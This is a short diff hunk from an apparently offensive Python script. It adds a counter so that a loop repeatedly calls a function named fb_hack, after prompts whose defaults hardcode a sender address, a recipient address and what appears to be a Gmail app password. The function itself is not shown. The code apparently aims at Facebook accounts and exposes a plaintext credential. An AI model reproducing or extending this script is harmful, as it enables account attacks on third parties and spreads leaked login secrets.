@@ -153,6 +153,7 @@ reset = int(input('Code: ') or 1)
 sender_email = input("Your Email:") or "krarktel@gmail.com"
 receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
 password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
+past = 1
 while past != 0:
   fb_hack(ehack, reset)
 
